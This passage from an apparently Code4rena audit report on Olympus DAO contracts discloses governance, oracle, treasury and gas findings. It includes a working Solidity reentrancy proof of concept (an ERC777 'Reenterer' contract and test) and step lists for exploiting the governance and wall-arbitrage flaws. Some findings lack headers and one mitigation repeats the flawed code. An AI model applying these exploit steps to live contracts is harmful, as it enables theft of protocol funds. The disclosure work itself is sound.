Because `VOTES` can be minted by `voter_admin`, and there is no cap on totalSupply, the `voter_admin` has the privileged ability to mint as many `VOTES` as they want in order to get any proposal to pass or veto it.

### Proof of Concept - Veto

*   Be `voter_admin`
*   Mint XYZ tokens
*   totalSupply is now higher so any proposal can be [vetoed per this line](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L268-L269)

### Proof of Concept - Approve

*   Be `voter_admin`
*   Mint XYZ tokens, where XYZ allows the `netVotes * 100 < VOTES.totalSupply() * EXECUTION_THRESHOLD` check to pass
*   Mint `VOTES` to self
*   Vote
*   Proposal has passed

### Recommended Mitigation Steps

Add a total supply cap to `VOTES`.

## [[M-18] Inconsistency in staleness checks between OHM and reserve token oracles](https://github.com/code-423n4/2022-08-olympus-findings/issues/391)
_Submitted by okkothejawa, also found by datapunk, reassor, and Trust_

<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L165-L171><br>

Price oracle may fail and revert due to the inconsistency in the staleness checks.

### Proof of Concept

In the `getCurrentPrice()` of `PRICE.sol`, Chainlink oracles are used to get the price of OHM against a reserve token, and a staleness check is used to make sure the price oracles are reporting fresh data. Yet the freshness requirements are inconsistent, for OHM, `updatedAt` should be lower than current timestamp minus three times the observation frequency, while for the reserve price, it is required that `updatedAt` should be lower than current timestamp minus the observation frequency. Our understanding is that that frequency is multiplied by 3 so that there can be some meaningful room where price data is accepted, as the time frame of only observation frequency (multiplied by 1) may not be enough for the oracle to realistically update its data.  (In other words, the frequency of new price information might be lower than the observation frequency, which is probably the case as third multiple is used for the OHM price).  If this is the case, this inconsistency may lead to the `getCurrentPrice()` reverting as while third multiple of the observation frequency might give enough space for the first oracle, second oracle's first multiple of frequency time frame might not be enough and it couldn't pass the staleness check due to unrealistic expectation of freshness.

### Tools Used

Manual review, talking with devs

### Recommended Mitigation Steps

Change the line 171 to

                if (updatedAt < block.timestamp - 3 * uint256(observationFrequency))

like line 165.

## [[M-19] TRSRY: reenter from `OlympusTreasury::repayLoan` to `Operator::swap`](https://github.com/code-423n4/2022-08-olympus-findings/issues/403)
_Submitted by zzzitron_

One can repay loan to the treasury with the value from the `Operator::swap`.

Condition:

*   the reserve token in Operator has hook for sender (like ERC777)
*   the debt is the same token as reserve

### Proof of Concept

The below code snippet shows a part of proof of concept for reentrancy attack, which is based on `src/test/policies/Operator.t.sol`. The full test code can be found [here](https://gist.github.com/zzzitron/651e1451ac1ff21be8a72b502b26f7cb), and [git diff from the `Operator.t.sol`](https://gist.github.com/zzzitron/5b8ebe635ed1939f18a100c7940b4f11).

Let's say that the reserve token implements ERC777 with the hook for the sender [(see weird erc20)](https://github.com/d-xo/weird-erc20#reentrant-calls). If the attacker can take debt of the reserve currency for the attack contract `Reenterer`, the contract can call `OlympusTreasury::repayLoan` and in the middle of repay call `Operator::swap` function. The `swap` function will modify the reserve token balance of treasury and the amount the attacker swapped will be also be used for the `repayLoan`.

In the below example, the attacker has debt of 1e18, and repays 1e17. But since the `swap` function is called in the `repayLoan`, the debt is reduced 1e17 more then it should. And the swap happened as expected so the attack has the corresponding ohm token.

```solidity
/// Mock to simulate the senders hook
/// for simplicity omitted the certain aspects like ERC1820 registry and etc.
contract MockERC777 is MockERC20 {
    constructor () MockERC20("ERC777", "777", 18) {}

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _callTokenToSend(from, to, amount);
        return super.transferFrom(from, to, amount);
        // _callTokenReceived(from, to, amount);
    }

    // simplified implementation for ERC777
    function _callTokenToSend(address from, address to, uint256 amount) private {
      if (from != address(0)) {
        IERC777Sender(from).tokensToSend(from, to, amount);
      }
    }
}

interface IERC777Sender {
  function tokensToSend(address from, address to, uint256 amount) external;
}

/// Concept for an attack contract
contract Reenterer is IERC777Sender {
  ERC20 public token;
  Operator public operator;
  bool public entered;

  constructor(address token_, Operator op_) {
    token = ERC20(token_);
    operator = op_;
  }

  function tokensToSend(address from, address to, uint256 amount) external override {
    if (!entered) {
    // call swap from reenter
    // which will manipulate the balance of treasury
      entered = true;
      operator.swap(token, 1e17, 0);
    }
  }
  
  function attack(OlympusTreasury treasury) public {
    // approve to the treasury
    token.approve(address(treasury), 1e18);
    token.approve(address(operator), 100* 1e18);

    // repayDebt of 1e17
    treasury.repayLoan(token, 1e17);
  }
}
```

```solidity
/// the test
    function test_poc__reenter() public {
        vm.prank(guardian);
        operator.initialize();

      reserve.mint(address(reenterer), 1e18);
      assertEq(treasury.reserveDebt(reserve, address(reenterer)), 1e18);
      // start repayLoan
      reenterer.attack(treasury);
      // it should be 9 * 1e17 but it is 8 * 1e17
      assertEq(treasury.reserveDebt(reserve, address(reenterer)), 8*1e17);
    }
```

### Cause

The `repayLoan`, in the line 110 below,  calls the `safeTransferFrom`. The balance before and after are compared to determine how much of debt is paid. So, if the `safeTranferFrom` can modify the balance, the attacker can profit from it.

```solidity
// OlympusTreasury::repayLoan
// https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L105-L112
105     function repayLoan(ERC20 token_, uint256 amount_) external nonReentrant {
106         if (reserveDebt[token_][msg.sender] == 0) revert TRSRY_NoDebtOutstanding();
107
108         // Deposit from caller first (to handle nonstandard token transfers)
109         uint256 prevBalance = token_.balanceOf(address(this));
110         token_.safeTransferFrom(msg.sender, address(this), amount_);
111
112         uint256 received = token_.balanceOf(address(this)) - prevBalance;
```

In the `swap` function, if the amount in token is reserve, the payment token to buy ohm will be paid to the treasury. It gives to an opportunity to modify the balance.

```solidity
// Operator::swap
// https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L330
329             /// Transfer reserves to treasury
330             reserve.safeTransferFrom(msg.sender, address(TRSRY), amountIn_);
```

Although both of `Operator::swap` and `OlympusTreasury::repayLoan` have `nonReentrant` modifier, it does not prevent as they are two different contracts.

### Tools Used

Foundry

### Recommended Mitigation Steps

The deposit logic in the `OlympusTreasury::repayLoan` was trying to handle nonstandard tokens, such as fee-on-transfer. But by doing so introduced an attack vector for tokens with ERC777. If the reserve token should be decided in the governance, it should be clarified, which token standards can be used safely.

## [[M-20] Operator: if WallSpread is 10000, `operate` and `beat` will revert and price information cannot be updated anymore](https://github.com/code-423n4/2022-08-olympus-findings/issues/404)
_Submitted by zzzitron_

The `beat` cannot be called anymore and price information will not be updated

Condition:

*   the wallspread is set to 10000 (100%)
*   lower wall is active (range.low\.active==true)
*   the price falls into the lower cushion (currentPrice < range.cushion.low\.price && currentPrice > range.wall.low\.price), therefore activates the lower bond market

### Proof of Concept

The below proof of concept demonstrates that the `operate` will revert with 100% wallspread. The full test code can be found [here](https://gist.github.com/zzzitron/74dfbc0249151a682061cd6532628d87) as well as [the diff from `Operator.t.sol`](https://gist.github.com/zzzitron/216d67cc0c7def5450b921f9c7f9ae91).

In the test, the wallspread was set to 10000, which is 100% (line 51). The price was set so that the lower market should be deployed (line 59). In the market deployment logic (`Operator::_activate`) will revert due to division by zero, and `operate` will fail.

Once this condition is met, the `operate` cannot be called and `Heart::beat` cannot be called as well, since the `Heart::beat` is calling `Operator::opearate` under the hood. As the result the price can never be updated. But other codes who uses the price information will not know that the price information is stale. If the upper wall is active and still have the capacity, one can swap from the upper wall using the stale information, which might cause some loss of funds.

```solidity
    function test_poc__lowCushionDeployWithWallspread10000Reverts() public {
        /// Initialize operator
        vm.prank(guardian);
        operator.initialize();

        /// if the wallspread is 10000 the operate might revert
        vm.prank(policy);
        operator.setSpreads(7000, 10000);

        /// Confirm that the cushion is not deployed
        assertTrue(!auctioneer.isLive(range.market(true)));

        /// Set price on mock oracle into the lower cushion
        /// given the lower wallspread is 10000
        /// when the lower market should be deployed the operate reverts
        price.setLastPrice(20 * 1e18);

        /// Trigger the operate function manually
        /// The operate will revert Error with "Division or modulo by 0"
        /// But I could not figure out to catch with `expectRevert`
        /// so just commenting out the assert
        // vm.prank(guardian);
        // /// vm.expectRevert(bytes("Division or module by 0"));   // this cannot catch the revert...
        // operator.operate();
    }
```

### Cause

The main cause is that the `RANGE::setSpreads` function fails to check for `wallSpread_ == 10000`. If the setter does not allow the wallSpread to be 100%, the price of the lower wall will not go to zero.

```solidity
// modules/RANGE.sol
// https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L242-L250

242     function setSpreads(uint256 cushionSpread_, uint256 wallSpread_) external permissioned {
243         // Confirm spreads are within allowed values
244         if (
245             wallSpread_ > 10000 ||
246             wallSpread_ < 100 ||
247             cushionSpread_ > 10000 ||
248             cushionSpread_ < 100 ||
249             cushionSpread_ > wallSpread_
250         ) revert RANGE_InvalidParams();
```

In the `RANGE::updatePrices`, the price of lower wall will be zero if the wallSpread is 100%.
If the price of lower wall is zero, the `Operator::_activate` will fail for the lower cushion.

```solidity
// policies/Operator.sol::_activate(bool high_)
// when high_ is false
421             uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price;

// modules/RANGE.sol::updatePrices
164         _range.wall.low.price = (movingAverage_ * (FACTOR_SCALE - wallSpread)) / FACTOR_SCALE;
```

### Tools Used

### Recommended Mitigation Steps

242     function setSpreads(uint256 cushionSpread_, uint256 wallSpread_) external permissioned {
243         // Confirm spreads are within allowed values

## [[M-21] OlympusGovernance - active proposal does not expire](https://github.com/code-423n4/2022-08-olympus-findings/issues/100)
_Submitted by reassor_

Contract `OlympusGovernance` allows controlling protocol through on-chain governing. The issue is that once proposal is active it does not expire, which means that until the new proposal will be selected, anyone can vote on existing one and potentially execute it when it might cause harm to the protocol.

Scenario:

1.  New proposal has been submited, endorsed and activated.
2.  Users vote, but the quroum is not being achieved.
3.  The proposal is active until new one is getting submitted.
4.  6 months elapses and the current active proposal might cause serious harm to the protocol (since it was created long time ago).
5.  Malicious actor votes and executes proposal causing harm to the protocol.

### Proof of Concept

`Governance.sol`:

*   <https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L265-L289>

### Tools Used

Manual Review / VSCode

### Recommended Mitigation Steps

It is recommended to add expiration for the active proposal for example 2 weeks. After that time it should be possible to reject proposal and users should be able to reclaim VOTES tokens.

## [[M-22] Low market bonds/swaps not working after loan is taken from treasury](https://github.com/code-423n4/2022-08-olympus-findings/issues/422)
_Submitted by immeas_

<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L60><br>

I am bordering between this being medium and low, but since this is, granted under very unlikely circumstances, hindering intended transfers to work I am submitting it as medium. That said, I don't think this scenario is very likely since it requires a trusted contract not part of initial release(? no contract in repo used a loan) to take a large loan from TRSRY.

### Proof of Concept

This will cause test to fail on `TRANSFER_FAILED` due to TRSRY not having the tokens to transfer but `getReserveBalance` says it has, since capacity is determined based on non-existing tokens.

## [[M-23] Treasury module is vulnerable to cross-contract reentrancy](https://github.com/code-423n4/2022-08-olympus-findings/issues/426)
_Submitted by Czar102_

<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L108-L112><br>

An attacker can pay back their loan to the treasury module with protocol-owned tokens. This will cause their loan to decrease despite the protocol won't be given funds for it.

### Proof of Concept

The code first measures the number of tokens in the treasury, then transfers an amount to the contract and checks the change it caused. This is put behind a nonReentrant modifier so that one can't use the same balance change to pay back multiple parts of (potentially) multiple loans.

The problem arises when the treasury doesn't only claim tokens from paying back loans, but also claims protocol revenue. Since, an attacker can gain execution in the moment the funds are pulled to the treasury to trigger any function that grants treasury this type of tokens (collects protocol revenue). The contract will count these tokens as paying back one's loan since this happened between balance measurements.

### Recommended Mitigation Steps

Add a function used to pull a token to the contract and mark it nonReentrant. Any transfer of tokens to the treasury should be done through that function.

## [[M-24] [NAZ-M1] Chainlink's `latestRoundData` Might Return Stale Results](https://github.com/code-423n4/2022-08-olympus-findings/issues/441)

<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L170><br>

Across these contracts, you are using Chainlink's `latestRoundData` API, but there is only a check on `updatedAt`. This could lead to stale prices according to the Chainlink documentation:

*   [Historical Price data](https://docs.chain.link/docs/historical-price-data/#historical-rounds)
*   [Checking Your returned answers](https://docs.chain.link/docs/faq/#how-can-i-check-if-the-answer-to-a-round-is-being-carried-over-from-a-previous-round)

The result of `latestRoundData` API will be used across various functions, therefore, a stale price from Chainlink can lead to loss of funds to end-users.

### Recommended Mitigation Steps

Consider adding the missing checks for stale data.

For example:

```js
(uint80 roundID ,answer,, uint256 timestamp, uint80 answeredInRound) = AggregatorV3Interface(chainLinkAggregatorMap[underlying]).latestRoundData();

require(answer > 0, "Chainlink price <= 0"); 
require(answeredInRound >= roundID, "Stale price");
require(timestamp != 0, "Round not complete");
```

## [[M-25] Moving average precision is lost](https://github.com/code-423n4/2022-08-olympus-findings/issues/483)
_Submitted by hyh, also found by CertoraInc, d3e4, and rbserver_

Now the precision is lost in moving average calculations as the difference is calculated separately and added each time, while it typically can be small enough to lose precision in the division involved.

For example, `10000` moves of `990` size, `numObservations = 1000`. This will yield `0` on each update, while must yield `9900` increase in the moving average.

### Proof of Concept

Moving average is calculated with the addition of the difference:

<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L134-L139>

```solidity
        // Calculate new moving average
        if (currentPrice > earliestPrice) {
            _movingAverage += (currentPrice - earliestPrice) / numObs;
        } else {
            _movingAverage -= (earliestPrice - currentPrice) / numObs;
        }
```

`/ numObs` can lose precision as `currentPrice - earliestPrice` is usually small.

It is returned on request as is:

<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L189-L193>

```solidity
    /// @notice Get the moving average of OHM in the Reserve asset over the defined window (see movingAverageDuration and observationFrequency).
    function getMovingAverage() external view returns (uint256) {
        if (!initialized) revert Price_NotInitialized();
        return _movingAverage;
    }
```

### Recommended Mitigation Steps

Consider storing the cumulative `sum`, while returning `sum / numObs` on request:

<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L189-L193>

## [[M-27] Unexecutable proposals when `Actions.MigrateKernel` is not last instruction](https://github.com/code-423n4/2022-08-olympus-findings/issues/51)

<https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/INSTR.sol#L61><br>

In `INSTR.sol`, it is correctly checked that a `ChangeExecutor` instruction only occurs at the last position to avoid situations where the other instructions are deemed as invalid.<br>
However, the same problem can occur for `MigrateKernel`. For instance, let's say we have a `MigrateKernel` followed by a `DeactivatePolicy` action. The `MigrateKernel` action will change the value of `kernel` within the policy. The `DeactivatePolicy` action tries to call `setActiveStatus` on the policy. However, this has a `onlyKernel` modifier and the call will therefore fail when it is done after the value of `kernel` was changed.

### Recommended Mitigation Steps

Perform the same check for `MigrateKernel`.

## [[M-28] Activating same Policy multiple times in Kernel possible](https://github.com/code-423n4/2022-08-olympus-findings/issues/52)
_Submitted by Lambda, also found by enckrish_

To check that an already active policy is not added a second time, `isActive()` is called on the policy. However, `policy` could be a malicious contract that always returns `false` for `isActive()`. In such a scenario, it would be possible to activate the policy multiple times for the same Kernel. This would break uniqueness invariants such that `_deactivatePolicy()` no longer works. However, it could also be used for a DoS attack: As `_reconfigurePolicies` and `_migrateKernel` iterate over those lists that now contain duplicates, they could run out of gas if a policy is activated enough times.

### Recommended Mitigation Steps

Check `getPolicyIndex[policy_] != 0` instead of relying on a value of an untrusted contract.

## [[M-29] TRSRY susceptible to loan / withdraw confusion](https://github.com/code-423n4/2022-08-olympus-findings/issues/75)
_Submitted by Trust, also found by 0xSky, datapunk, and tonisives_

<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L64-L102><br>

Treasury allocates approvals in the withdrawApproval mapping which is set via setApprovalFor(). In both withdrawReserves() and in getLoan(), \_checkApproval() is used to verify user has enough approval and subtracts the withdraw / loan amount. Therefore, there is no differentiation in validation between loan approval and withdraw approval. Policies which will use getLoan() (currently none) can simply withdraw the tokens without bookkeeping it as a loan.

### Proof of Concept

1.  Policy P has getLoan permission
2.  setApprovalFor(policy, token, amount) was called to grant P permission to loan amount
3.  P calls withdrawReserves(address, token, amount) and directly withdraws the funds without registering as loan

### Recommended Mitigation Steps

A separate mapping called loanApproval should be implemented, and setLoanApprovalFor() will set it, getLoan() will reduce loanApproval balance.

`beat()` function is allowed to be called by anyone once in `frequency()` period. The purpose of it is to update the prices and do another operations related to bond market. User who ran it are rewarded. There is no need to run this function more then 1 time in `frequency()` period.
However if `beat()` was last time called more then `frequency()` time ago then user can execute `beat()` function `(block.timestamp - lastBeat)/frequency()` times in a row in same block and get rewards.

The Walls of the RBS mechanism offer zero slippage swaps at the high and low of the moving average spread. The capacity to be swapped at these prices is usually very large, so it must make sure to only be enabled when the prices are guaranteed to be synced. However, there is no such check. If beat() is not called for some time, meaning we cannot determine if the current spread is legit, swap() still operates as usual.

### Impact

The worst case scenario is that the wall is swapping at a losing price, meaning they can be immediately drained via arbitrage bot.

### Proof of concept

    1. Price is X at the start
    2. Oracle stops updating for some reason / no one calls beat()
    3. Price drops to Y , where Y < low wall centered around X
    4. Attacker can perform arbitrage by buying Ohm at external markets at Y and selling Ohm at low wall price, netting the difference.

### Recommended mitigation steps:

Change modifier onlyWhileActive to add a check for beat out of sync:

    if (block.timestamp > lastBeat + SYNC_THRESHOLD * frequency())

Granting and revoking roles will be possible to do only via a contract, which looks like an unintended behavior since these operations cannot be performed via governance (the governance contract is designed to be the only executor).

### Proof of Concept

Admin address can be changed to any address (EOA or contract) in the `executeAction` function in `Kernel`:<br>
<https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L252-L253>

This piece explicitly allows EOA addresses since the other actions in the function (besides `ChangeExecutor`) are checked to have only a contract as the target (see `ensureContract` function calls in the other actions). This, and the fact that roles cannot be managed via governance, leads to the conclusion that an admin is designed to be an EOA.

However, in the `store` function in `INSTR`, action target can only be a contract:<br>
<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L52>

After the contracts are deployed, `INSTR` will be the only contract that's allowed to call `Kernel.executeAction`:<br>
<https://github.com/code-423n4/2022-08-olympus/blob/main/src/scripts/Deploy.sol#L220>

Thus, there will be no way to change admin to an EOA. If admin needs to be an EOA, the `INSTR` contract needs to be patched and re-deployed to allow non-contract targets.

### Recommended Mitigation Steps

Allow EOA addresses as instruction targets or disallow non-contract admin addresses.

## [L-01] Operator: incorrect accounting for fee-on-transfer reserve token

*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L330>

If the reserve token is fee-to-transfer token and the user is buying ohm, the `Operator::swap` will incorrectly assume the `amountIn_` value is transferred, which fails to consider the fees. If the fee is rounded up, the attacker can purchase ohm without giving any assets to the treasury. It may not be profitable for the attacker, but it may cause devaluing of the ohm. However, the loss will be limited to the capacity.

```solidity
// Operator::swap
// if(tokenIn_ == reserve) : buying ohm
329             /// Transfer reserves to treasury
330             reserve.safeTransferFrom(msg.sender, address(TRSRY), amountIn_);
```

## [L-02] BondCallback: incorrect accounting if quoteToken is rebase token

*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L114>

If the quoteToken is rebase token, the priorBalances may change due to rebasing or airdrop. It may result to an incorrect accounting. However, whether it is exploitable depends on the Bond market's logic.<br>
With the current logic, it just checks whether the balance is increased more than the `inputAmount_`, so it is harder to exploit, compare to the alternative logic of using the difference in balances as the input amount. However, it also introduces the possibility of paying the users less than they deserve.

```solidity
// Callback::callback
113         // Check that quoteTokens were transferred prior to the call
114         if (quoteToken.balanceOf(address(this)) < priorBalances[quoteToken] + inputAmount_)
115             revert Callback_TokensNotReceived();
```

## [L-03] PRICE: unsafe cast for `numObservations`

*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L97>
*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L249-L257>
*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L281-L289>

The `movingAverageDuration` and `observationFrequency` are uint48. So `movingAverageDuration / observationFrequency` may overflow when casted to uint32. In the below snippet, line 281, the array will be set based on the uint256 value, but the `numObservations` is casted down to uint32. It may result in different `numObservations` and the length of `observations` array.
However, given the large numbers, the attempt to set such a large number as the parameters will likely to fail with "out of gas" error, since the length of the array `observations` is ridiculously large in this case. Yet, it is probably safe to set some upper limit for the `numObservations` or use safeCast.

```solidity
// modules/PRICE::constructor
  97         numObservations = uint32(movingAverageDuration_ / observationFrequency_);

// modules/PRICE::changeObservationFrequency
  280         // Store blank observations array of new size
  281         observations = new uint256[](newObservations);
  282
  283         // Set initialized to false and update state variables
  284         initialized = false;
  285         lastObservationTime = 0;
  286         _movingAverage = 0;
  287         nextObsIndex = 0;
  288         observationFrequency = observationFrequency_;
  289         numObservations = uint32(newObservations);
```

## [L-04] Operator: unsafe cast for decimals

*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L372>

*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L431-L434>

In the `Operator::_activate` decimal values were casted to `int8` and `uint8` back and forth. Since there is no check, those values can potentially overflow/underflow. However, if it happens the exponent in the line 376 will like to revert due to too large numbers. Besides, if the price decimals are that big, this may not be the biggest problem to face.

```solidity
// policies/Operator.sol::_activate

372             int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);

375             uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);

## [L-05] BondCallback: operator is not set `constructor`

*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L38-L45>

If the `operator` is not set, the `callback` function will revert so, it is crucial to set the `operator` before any operation. However, it was not set in the `constructor`, but should be set separately by calling `setOperator`.

## [L-06] Operator: missing check for configParmas\[0] (cushionFactor) in the constructor

*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L92-L150>
*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L516-L524>

The `Operator::constructor` does not check the condition of the `cushionFactor`. Below is the condition for the `cushionFactor` checked in the `Operator::setCushionFactor`.

```solidity
// Operator::setCushionFactor

516     function setCushionFactor(uint32 cushionFactor_) external onlyRole("operator_policy") {
517         /// Confirm factor is within allowed values
518         if (cushionFactor_ > 10000 || cushionFactor_ < 100) revert Operator_InvalidParams();
519
520         /// Set factor
521         _config.cushionFactor = cushionFactor_;
522
523         emit CushionFactorChanged(cushionFactor_);
524     }
```

## [L-07] Kernel: misplaced zero address check for `changeKernel`

*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L76-L78>
*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L254-L257>

Currently, the check for the `Kernel` to be a contract (also not to be the zero address), is in the current `Kernel` implementation. However, no modules and policies have the logic to ensure this as they inherit from `KernelAdapter`, which will just set the new kernel without a question. This will work well as long as the new Kernel has the similar logic to check the next Kernel's integrity. However, if the logic is forgotten, there is no other safe guard to ensure that the next kernel is not a zero address and is a contract.
Since `Kernel` is absolutely needed for this system's functionality, there is no possible case that the Kernel should be the zero address. Therefore, it is probably safe to add the checking logic to the `KernelAdapter`, so every module and policy will check for the next Kernel. It costs more gas since the check is done multiple times, but still arguably it is worth the cost, since Kernel is core part of the system and it will not updated very often.

```solidity
// KernelAdapter::changeKernel
 76     function changeKernel(Kernel newKernel_) external onlyKernel {
 77         kernel = newKernel_;
 78     }

// Kernel::executeAction
254         } else if (action_ == Actions.MigrateKernel) {
255             ensureContract(target_);
256             _migrateKernel(Kernel(target_));
257         }
```

## [L-08] BondCallback, Operator: upon module's upgrade, the token approval should be revoked

*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L57>
*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L167>

The `BondCallback` and `Operator` approves ohm to the `MINTR` module in the `configureDependencies`. However, there is no logic to revoke those approvals (e.i. approve to zero). In the case of the `MINTR` has some bugs, it may be desirable to be able to revoke the approvals.

```solidity
// Operator::configureDependencies
167         ohm.safeApprove(address(MINTR), type(uint256).max);
```

## [L-09] Heart: if the issueReward fails the heart beat will revert

*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L106>

If the `_issueReward` reverts, for example, because the token balance is too low, the `beat` will as well revert, due to the `safeTransfer`. One might consider not to revert even in the case the `_issueReward` reverts.

## [N-01] Kernel: missing zero address check for `executor` and `admin`

*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L250-L253>

The `executor` and `admin` are not checked for the zero address when set by the `Kernel::executeAction`.

```solidity
// Kernel::executeAction
250         } else if (action_ == Actions.ChangeExecutor) {
251             executor = target_;
252         } else if (action_ == Actions.ChangeAdmin) {
253             admin = target_;
```

## [N-02] INSTR, Governance: upon module's upgrade, all instruction data should be carried over to the new modules

*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L167>
*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L187>

The `Governance`'s logic will break if the `INSTR` module is upgraded to a new contract without having the same instructions data,  since the `proposalId`'s the `Governance` is using are bound to the `INSTR` module.

## [N-03] RANGE, PRICE: unused import of `FullMath`

*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L18>
*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L23>

The modules `RANGE` and `PRICE` imports `FullMath`, but it is not used.

```solidity
// modules/PRICE.sol
 22 contract OlympusPrice is Module {
 23     using FullMath for uint256;
```

## [N-04] PRICE: stale price

There is no indicator whether the price information is up-to-date. If the price information is not properly updated, the other contracts will keep using the data resulting in incorrect prices for swap.

## Summary

Gas savings are estimated using the gas report of existing `FORGE_GAS_REPORT=true forge test` tests (the sum of all deployment costs and the sum of the costs of calling all methods) and may vary depending on the implementation of the fix. I keep my version of the fix for each finding and can provide them if you need.<br>
Some optimizations (mostly logical) cannot be scored with a exact gas quantity.

## [G-02]  `storage` pointer to a structure is cheaper than copying each value of the structure into `memory`, same for `array` and `mapping` (7 instances)

Deployment Gas Saved: **188 639**<br>

It may not be obvious, but every time you copy a storage `struct`/`array`/`mapping` to a `memory` variable, you are literally copying each member by reading it from `storage`, which is expensive. And when you use the `storage` keyword, you are just storing a pointer to the storage, which is much cheaper.

SLOADs are expensive (100 gas after the 1st one) compared to MLOADs/MSTOREs (3 gas each). Storage values read multiple times should instead be cached in memory the first time (costing 1 SLOAD) and then read from this cache to avoid multiple SLOADs.

## [G-06]  Using bools for storage incurs overhead (6 instances)

Deployment Gas Saved: **23 611**<br>
Method Call Gas Saved: **4 485**<br>

    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas) for the extra SLOAD, and to avoid Gsset (20000 gas) when changing from 'false' to 'true', after having been 'true' in the past.

**Important**: This rule doesn't always work, sometimes a bool is packed with another variable in the same slot, sometimes it's packed into a struct, sometimes the optimizer makes bool more efficient. You can see the @note in the code for each case.

If variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (20000 gas). Reads of the variables can also be cheaper.

**NOTE**: one slot = 32 bytes

## [G-09] Increment optimization (18 instances)

For a uint256 i variable, the following is true with the Optimizer enabled at 10k:

Increment:

i += 1 is the most expensive form<br>
i++ costs 6 gas less than i += 1<br>
\++i costs 5 gas less than i++ (11 gas less than i += 1)<br>

Decrement:

i -= 1 is the most expensive form<br>
i-- costs 11 gas less than i -= 1<br>
\--i costs 5 gas less than i-- (16 gas less than i -= 1)<br>
